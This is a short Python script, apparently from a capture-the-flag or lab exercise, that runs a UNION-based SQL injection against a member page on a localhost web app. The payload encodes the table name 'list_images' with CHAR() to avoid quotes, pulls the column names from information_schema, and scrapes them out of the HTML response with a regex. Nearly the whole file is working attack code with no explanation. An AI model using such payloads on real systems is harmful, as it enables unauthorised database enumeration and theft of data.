from requests import get
import re

def main():    
    # list_images COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(108,105,115,116,95,105,109,97,103,101,115)" # list_images
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    list_imagesTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

    for name in list_imagesTableColumns:
        print(name)

if __name__ == "__main__":
	main()